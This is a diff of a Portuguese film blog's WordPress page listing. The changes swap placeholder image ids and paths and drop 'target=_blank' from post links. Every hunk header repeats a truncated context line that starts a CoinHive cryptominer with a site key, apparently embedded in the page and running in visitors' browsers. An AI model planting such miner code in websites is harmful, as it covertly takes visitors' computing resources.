+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46af4e7" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb804381bb7' ).animateSvg();
+                $( '#59bd5e46af4e7' ).animateSvg();
               });
-            } else { $( '#59bb804381bb7' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46af4e7' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Mulher Maravilha (Wonder Woman, 2017)" data-hu-post-id="59bb804381bb7" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Mulher Maravilha (Wonder Woman, 2017)" data-hu-post-id="59bd5e46af4e7" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -446,7 +493,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5989" rel="bookmark" title="Mulher Maravilha (Wonder Woman, 2017)" target="_blank">Mulher Maravilha (Wonder Woman, 2017)</a>
+			<a href="/archives/5989" rel="bookmark" title="Mulher Maravilha (Wonder Woman, 2017)">Mulher Maravilha (Wonder Woman, 2017)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -459,18 +506,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5988" title="Dicas Netflix Junho">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb804394208" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46beaf0" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb804394208' ).animateSvg();
+                $( '#59bd5e46beaf0' ).animateSvg();
               });
-            } else { $( '#59bb804394208' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46beaf0' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Dicas Netflix Junho" data-hu-post-id="59bb804394208" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Dicas Netflix Junho" data-hu-post-id="59bd5e46beaf0" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -486,7 +533,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5988" rel="bookmark" title="Dicas Netflix Junho" target="_blank">Dicas Netflix Junho</a>
+			<a href="/archives/5988" rel="bookmark" title="Dicas Netflix Junho">Dicas Netflix Junho</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -499,18 +546,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5983" title="Filmes assistidos em Maio">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043bb535" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46d0391" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043bb535' ).animateSvg();
+                $( '#59bd5e46d0391' ).animateSvg();
               });
-            } else { $( '#59bb8043bb535' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46d0391' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes assistidos em Maio" data-hu-post-id="59bb8043bb535" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes assistidos em Maio" data-hu-post-id="59bd5e46d0391" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -526,7 +573,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5983" rel="bookmark" title="Filmes assistidos em Maio" target="_blank">Filmes assistidos em Maio</a>
+			<a href="/archives/5983" rel="bookmark" title="Filmes assistidos em Maio">Filmes assistidos em Maio</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -539,18 +586,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5974" title="Sobre cineastas e grandes orçamentos">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043be715" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46ddac6" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043be715' ).animateSvg();
+                $( '#59bd5e46ddac6' ).animateSvg();
               });
-            } else { $( '#59bb8043be715' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46ddac6' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Sobre cineastas e grandes orçamentos" data-hu-post-id="59bb8043be715" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Sobre cineastas e grandes orçamentos" data-hu-post-id="59bd5e46ddac6" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -566,7 +613,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5974" rel="bookmark" title="Sobre cineastas e grandes orçamentos" target="_blank">Sobre cineastas e grandes orçamentos</a>
+			<a href="/archives/5974" rel="bookmark" title="Sobre cineastas e grandes orçamentos">Sobre cineastas e grandes orçamentos</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -579,18 +626,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5513" title="Alien: Covenant (2017)">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043c1111" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e46e9ae5" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043c1111' ).animateSvg();
+                $( '#59bd5e46e9ae5' ).animateSvg();
               });
-            } else { $( '#59bb8043c1111' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e46e9ae5' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Alien: Covenant (2017)" data-hu-post-id="59bb8043c1111" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Alien: Covenant (2017)" data-hu-post-id="59bd5e46e9ae5" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -606,7 +653,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5513" rel="bookmark" title="Alien: Covenant (2017)" target="_blank">Alien: Covenant (2017)</a>
+			<a href="/archives/5513" rel="bookmark" title="Alien: Covenant (2017)">Alien: Covenant (2017)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -619,18 +666,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5432" title="Dicas Netflix Maio">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043c9580" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e470635d" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043c9580' ).animateSvg();
+                $( '#59bd5e470635d' ).animateSvg();
               });
-            } else { $( '#59bb8043c9580' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e470635d' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Dicas Netflix Maio" data-hu-post-id="59bb8043c9580" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Dicas Netflix Maio" data-hu-post-id="59bd5e470635d" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -646,7 +693,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5432" rel="bookmark" title="Dicas Netflix Maio" target="_blank">Dicas Netflix Maio</a>
+			<a href="/archives/5432" rel="bookmark" title="Dicas Netflix Maio">Dicas Netflix Maio</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -659,18 +706,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5247" title="Filmes assistidos em Abril">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043cd94f" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e47115b1" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043cd94f' ).animateSvg();
+                $( '#59bd5e47115b1' ).animateSvg();
               });
-            } else { $( '#59bb8043cd94f' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e47115b1' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes assistidos em Abril" data-hu-post-id="59bb8043cd94f" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes assistidos em Abril" data-hu-post-id="59bd5e47115b1" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -686,7 +733,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5247" rel="bookmark" title="Filmes assistidos em Abril" target="_blank">Filmes assistidos em Abril</a>
+			<a href="/archives/5247" rel="bookmark" title="Filmes assistidos em Abril">Filmes assistidos em Abril</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -699,18 +746,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/4811" title="A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043d0699" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e4722782" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043d0699' ).animateSvg();
+                $( '#59bd5e4722782' ).animateSvg();
               });
-            } else { $( '#59bb8043d0699' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e4722782' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)" data-hu-post-id="59bb8043d0699" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)" data-hu-post-id="59bd5e4722782" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -726,7 +773,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4811" rel="bookmark" title="A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)" target="_blank">A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)</a>
+			<a href="/archives/4811" rel="bookmark" title="A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)">A Vigilante do Amanhã: Ghost in the Shell (Ghost in the Shell, 2017)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -739,18 +786,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/4558" title="Filmes assistidos em Março">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8043d5955" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e4747edd" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8043d5955' ).animateSvg();
+                $( '#59bd5e4747edd' ).animateSvg();
               });
-            } else { $( '#59bb8043d5955' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e4747edd' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Filmes assistidos em Março" data-hu-post-id="59bb8043d5955" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Filmes assistidos em Março" data-hu-post-id="59bd5e4747edd" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -766,7 +813,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4558" rel="bookmark" title="Filmes assistidos em Março" target="_blank">Filmes assistidos em Março</a>
+			<a href="/archives/4558" rel="bookmark" title="Filmes assistidos em Março">Filmes assistidos em Março</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -795,7 +842,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
